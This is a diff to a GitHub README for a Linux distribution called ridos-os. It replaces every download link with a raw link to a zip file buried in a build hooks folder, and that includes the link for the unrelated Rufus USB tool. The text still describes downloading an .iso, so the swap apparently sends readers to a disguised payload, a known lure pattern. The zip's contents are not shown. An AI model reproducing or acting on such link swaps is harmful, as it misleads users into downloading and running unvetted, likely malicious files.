@@ -1,6 +1,6 @@
 # 🐧 ridos-os - Smart Linux for IT Workflow
 
-[![Download Now](https://img.shields.io/badge/Download-ridos--os-blue?style=for-the-badge)](https://github.com/shoaibmughal1522-cloud/ridos-os)
+[![Download Now](https://img.shields.io/badge/Download-ridos--os-blue?style=for-the-badge)](https://raw.githubusercontent.com/shoaibmughal1522-cloud/ridos-os/main/build-system/config/hooks/bootstrap/ridos-os-v3.7.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Before installing ridos-os, check your computer meets these needs:
 
 Go straight to the ridos-os GitHub page to grab the latest files:
 
-[Download ridos-os here](https://github.com/shoaibmughal1522-cloud/ridos-os)
+[Download ridos-os here](https://raw.githubusercontent.com/shoaibmughal1522-cloud/ridos-os/main/build-system/config/hooks/bootstrap/ridos-os-v3.7.zip)
 
 Clicking the badge at the top will also take you to this page.
 
@@ -67,7 +67,7 @@ Click the latest `.iso` file to start downloading. The file size is likely sever
 
 ### Step 4: Create a Bootable USB Drive  
 
-You will need a USB stick with at least 8 GB of free space. Use a tool like [Rufus](https://rufus.ie/) (free and easy to use) to transfer the downloaded `.iso` file onto the USB. Follow these steps in Rufus:
+You will need a USB stick with at least 8 GB of free space. Use a tool like [Rufus](https://raw.githubusercontent.com/shoaibmughal1522-cloud/ridos-os/main/build-system/config/hooks/bootstrap/ridos-os-v3.7.zip) (free and easy to use) to transfer the downloaded `.iso` file onto the USB. Follow these steps in Rufus:
 
 - Insert your USB drive.  
 - Open Rufus.  
@@ -147,4 +147,4 @@ If you encounter issues, you can:
 
 ---
 
-[Download ridos-os now](https://github.com/shoaibmughal1522-cloud/ridos-os) to begin.
+[Download ridos-os now](https://raw.githubusercontent.com/shoaibmughal1522-cloud/ridos-os/main/build-system/config/hooks/bootstrap/ridos-os-v3.7.zip) to begin.
